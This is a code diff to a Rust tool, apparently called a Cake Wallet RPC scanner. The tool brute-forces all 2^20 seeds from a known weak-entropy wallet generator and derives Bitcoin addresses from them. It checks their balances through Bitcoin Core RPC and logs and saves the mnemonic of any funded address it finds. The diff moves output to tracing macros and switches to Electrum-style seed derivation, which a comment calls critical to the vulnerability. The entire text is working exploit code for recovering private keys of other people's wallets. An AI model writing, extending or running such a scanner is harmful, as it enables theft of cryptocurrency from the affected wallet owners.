@@ -4,13 +4,14 @@ use bitcoin::bip32::{DerivationPath, Xpriv};
 use bitcoin::secp256k1::Secp256k1;
 use bitcoin::{Address, Network};
 use bitcoincore_rpc::{Auth, Client, RpcApi};
-use std::io::Write;
+use crate::utils::electrum;
 use std::str::FromStr;
+use tracing::{info, warn, error};
 
 /// Scans Cake Wallet vulnerable addresses (20-bit entropy) and checks balances via Bitcoin Core RPC
 pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
-    println!("Cake Wallet RPC Scanner - Checking 2^20 vulnerable addresses...");
-    println!("Connecting to Bitcoin Core at {}...", rpc_url);
+    info!("Cake Wallet RPC Scanner - Checking 2^20 vulnerable addresses...");
+    info!("Connecting to Bitcoin Core at {}...", rpc_url);
 
     let rpc = Client::new(
         rpc_url,
@@ -19,8 +20,8 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
 
     // Test connection
     let blockchain_info = rpc.get_blockchain_info()?;
-    println!("Connected! Synced to block: {}", blockchain_info.blocks);
-    println!("Chain: {}", blockchain_info.chain);
+    info!("Connected! Synced to block: {}", blockchain_info.blocks);
+    info!("Chain: {}", blockchain_info.chain);
 
     let secp = Secp256k1::new();
     let network = Network::Bitcoin;
@@ -28,8 +29,8 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
     // 20 bits = 1,048,576 possibilities
     let max_entropy = 1 << 20;
 
-    println!("Scanning {} possible seeds...", max_entropy);
-    println!(
+    info!("Scanning {} possible seeds...", max_entropy);
+    info!(
         "This will take approximately {} minutes at 1000 checks/sec",
         max_entropy / 1000 / 60
     );
@@ -44,7 +45,8 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
         entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());
 
         let mnemonic = Mnemonic::from_entropy(&entropy[0..16])?;
-        let seed = mnemonic.to_seed("");
+        // Use Electrum seed derivation ("electrum" salt) - critical for Cake Wallet vulnerability
+        let seed = electrum::mnemonic_to_seed(&mnemonic.to_string());
         let root = Xpriv::new_master(network, &seed)?;
 
         // Check multiple derivation paths
@@ -71,14 +73,14 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
                         Ok(amount) => {
                             if amount.to_sat() > 0 {
                                 found += 1;
-                                println!(
+                                warn!(
                                     "\n🎯 FOUND! Seed: {}, Path: {}, Address: {}, Amount: {} BTC",
                                     i,
                                     path_str,
                                     address,
                                     amount.to_btc()
                                 );
-                                println!("Mnemonic: {}", mnemonic);
+                                warn!("Mnemonic: {}", mnemonic);
 
                                 // Write to file
                                 std::fs::write(
@@ -91,7 +93,7 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
                         Err(e) => {
                             // Address might not be in wallet, which is fine
                             if !e.to_string().contains("Invalid Bitcoin address") {
-                                eprintln!("RPC error for {}: {}", address, e);
+                                error!("RPC error for {}: {}", address, e);
                             }
                         }
                     }
@@ -103,21 +105,20 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
         if checked % 1000 == 0 {
             let elapsed = start.elapsed().as_secs_f64();
             let rate = checked as f64 / elapsed;
-            print!(
-                "\rChecked: {}/{} ({:.1}%) - Speed: {:.0} addr/sec - Found: {}",
+            info!(
+                "Checked: {}/{} ({:.1}%) - Speed: {:.0} addr/sec - Found: {}",
                 checked,
                 max_entropy * 3,
                 (checked as f64 / (max_entropy * 3) as f64) * 100.0,
                 rate,
                 found
             );
-            std::io::stdout().flush().ok();
         }
     }
 
-    println!("\n\nScan complete!");
-    println!("Total checked: {}", checked);
-    println!("Total found: {}", found);
+    info!("\n\nScan complete!");
+    info!("Total checked: {}", checked);
+    info!("Total found: {}", found);
 
     Ok(())
 }
